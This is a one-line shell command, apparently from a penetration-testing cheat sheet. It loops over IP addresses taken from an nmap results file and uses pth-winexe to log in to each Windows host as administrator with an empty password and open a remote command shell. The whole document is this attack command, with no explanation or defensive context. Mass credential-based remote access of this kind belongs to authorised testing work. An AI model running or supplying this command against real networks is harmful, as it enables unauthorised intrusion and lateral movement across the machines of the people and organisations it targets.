awk '{print $1}' < nmaplabips.txt | while read ip; do pth-winexe -U administrator% //$ip cmd; done
